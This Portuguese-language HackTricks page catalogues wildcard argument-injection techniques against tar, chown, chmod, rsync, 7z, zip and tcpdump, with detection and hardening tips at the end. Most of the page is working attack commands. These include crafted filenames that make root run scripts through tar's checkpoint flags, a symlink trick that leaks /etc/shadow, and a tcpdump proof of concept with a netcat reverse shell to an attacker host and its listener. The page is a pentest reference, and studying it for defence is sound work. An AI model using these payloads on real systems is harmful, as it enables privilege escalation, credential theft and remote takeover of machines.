# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> A injeção de **argumento de wildcard** (também conhecida como *glob*) acontece quando um script privilegiado executa um binário Unix como `tar`, `chown`, `rsync`, `zip`, `7z`, … com um wildcard não entre aspas como `*`.
> Como o shell expande o wildcard **antes** de executar o binário, um atacante que pode criar arquivos no diretório de trabalho pode elaborar nomes de arquivos que começam com `-`, de modo que sejam interpretados como **opções em vez de dados**, efetivamente contrabandeando flags arbitrárias ou até mesmo comandos.
> Esta página coleta os primitivas mais úteis, pesquisas recentes e detecções modernas para 2023-2025.

## chown / chmod

Você pode **copiar o proprietário/grupo ou os bits de permissão de um arquivo arbitrário** abusando da flag `--reference`:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Quando o root executa algo como:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` é injetado, fazendo com que *todos* os arquivos correspondentes herdem a propriedade/permissões de `/root/secret``file`.

*PoC & ferramenta*: [`wildpwn`](https://github.com/localh0t/wildpwn) (ataque combinado).
Veja também o clássico artigo da DefenseCode para mais detalhes.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Execute comandos arbitrários abusando do recurso **checkpoint**:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Uma vez que o root executa, por exemplo, `tar -czf /root/backup.tgz *`, `shell.sh` é executado como root.

### bsdtar / macOS 14+

O `tar` padrão em versões recentes do macOS (baseado em `libarchive`) *não* implementa `--checkpoint`, mas você ainda pode alcançar a execução de código com a flag **--use-compress-program** que permite especificar um compressor externo.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Quando um script privilegiado executa `tar -cf backup.tar *`, `/bin/sh` será iniciado.

---

## rsync

`rsync` permite que você substitua o shell remoto ou até mesmo o binário remoto por meio de flags de linha de comando que começam com `-e` ou `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Se o root mais tarde arquivar o diretório com `rsync -az * backup:/srv/`, a flag injetada gera seu shell no lado remoto.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Mesmo quando o script privilegiado *defensivamente* prefixa o wildcard com `--` (para parar a análise de opções), o formato 7-Zip suporta **arquivos de lista de arquivos** prefixando o nome do arquivo com `@`. Combinando isso com um symlink permite que você *exfiltre arquivos arbitrários*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Se o root executar algo como:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip tentará ler `root.txt` (→ `/etc/shadow`) como uma lista de arquivos e sairá, **imprimindo o conteúdo no stderr**.

---

## zip

`zip` suporta a flag `--unzip-command` que é passada *verbatim* para o shell do sistema quando o arquivo será testado:
```bash
zip result.zip files -T --unzip-command "sh -c id"
```
Injete a flag através de um nome de arquivo elaborado e aguarde o script de backup privilegiado chamar `zip -T` (testar arquivo) no arquivo resultante.

---

## Binaries adicionais vulneráveis à injeção de wildcard (lista rápida de 2023-2025)

Os seguintes comandos foram abusados em CTFs modernos e em ambientes reais. O payload é sempre criado como um *nome de arquivo* dentro de um diretório gravável que será processado posteriormente com um wildcard:

| Binary | Flag para abusar | Efeito |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrário `@file` | Ler conteúdo do arquivo |
| `flock` | `-c <cmd>` | Executar comando |
| `git`   | `-c core.sshCommand=<cmd>` | Execução de comando via git sobre SSH |
| `scp`   | `-S <cmd>` | Iniciar programa arbitrário em vez de ssh |

Essas primitivas são menos comuns do que os clássicos *tar/rsync/zip*, mas vale a pena verificar ao caçar.

---

## ganchos de rotação do tcpdump (-G/-W/-z): RCE via injeção de argv em wrappers

Quando um shell restrito ou wrapper de fornecedor constrói uma linha de comando `tcpdump` concatenando campos controlados pelo usuário (por exemplo, um parâmetro "nome do arquivo") sem citação/validação rigorosa, você pode contrabandear flags extras do `tcpdump`. A combinação de `-G` (rotação baseada em tempo), `-W` (limitar número de arquivos) e `-z <cmd>` (comando pós-rotação) resulta em execução arbitrária de comando como o usuário que executa o tcpdump (geralmente root em dispositivos).

Pré-condições:

- Você pode influenciar `argv` passado para `tcpdump` (por exemplo, via um wrapper como `/debug/tcpdump --filter=... --file-name=<HERE>`).
- O wrapper não sanitiza espaços ou tokens prefixados por `-` no campo do nome do arquivo.

PoC clássica (executa um script de shell reverso a partir de um caminho gravável):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Detalhes:

- `-G 1 -W 1` força uma rotação imediata após o primeiro pacote correspondente.
- `-z <cmd>` executa o comando pós-rotação uma vez por rotação. Muitas compilações executam `<cmd> <savefile>`. Se `<cmd>` for um script/interpreter, certifique-se de que o manuseio de argumentos corresponda ao seu payload.

Variantes sem mídia removível:

- Se você tiver qualquer outro primitivo para escrever arquivos (por exemplo, um wrapper de comando separado que permite redirecionamento de saída), coloque seu script em um caminho conhecido e acione `-z /bin/sh /path/script.sh` ou `-z /path/script.sh` dependendo da semântica da plataforma.
- Alguns wrappers de fornecedores rotacionam para locais controláveis pelo atacante. Se você puder influenciar o caminho rotacionado (symlink/travessia de diretório), pode direcionar `-z` para executar conteúdo que você controla totalmente sem mídia externa.

Dicas de hardening para fornecedores:

- Nunca passe strings controladas pelo usuário diretamente para `tcpdump` (ou qualquer ferramenta) sem listas de permissão rigorosas. Coloque entre aspas e valide.
- Não exponha a funcionalidade `-z` em wrappers; execute tcpdump com um template seguro fixo e desautorize completamente flags extras.
- Remova privilégios do tcpdump (cap_net_admin/cap_net_raw apenas) ou execute sob um usuário não privilegiado dedicado com confinamento AppArmor/SELinux.

## Detecção & Hardening

1. **Desative a expansão de globos de shell** em scripts críticos: `set -f` (`set -o noglob`) impede a expansão de curingas.
2. **Coloque entre aspas ou escape** argumentos: `tar -czf "$dst" -- *` *não* é seguro — prefira `find . -type f -print0 | xargs -0 tar -czf "$dst"`.
3. **Caminhos explícitos**: Use `/var/www/html/*.log` em vez de `*` para que atacantes não possam criar arquivos irmãos que começam com `-`.
4. **Menor privilégio**: Execute trabalhos de backup/manutenção como uma conta de serviço não privilegiada em vez de root sempre que possível.
5. **Monitoramento**: A regra pré-construída da Elastic *Potential Shell via Wildcard Injection* procura por `tar --checkpoint=*`, `rsync -e*`, ou `zip --unzip-command` imediatamente seguido por um processo filho de shell. A consulta EQL pode ser adaptada para outros EDRs.

---

## Referências

* Elastic Security – Regra Detectada de Potencial Shell via Wildcard Injection (última atualização 2025)
* Rutger Flohil – “macOS — Injeção de curingas no Tar” (18 de dezembro de 2024)
* GTFOBins – [tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
* FiberGateway GR241AG – [Cadeia de Exploit Completa](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)

{{#include ../../banners/hacktricks-training.md}}
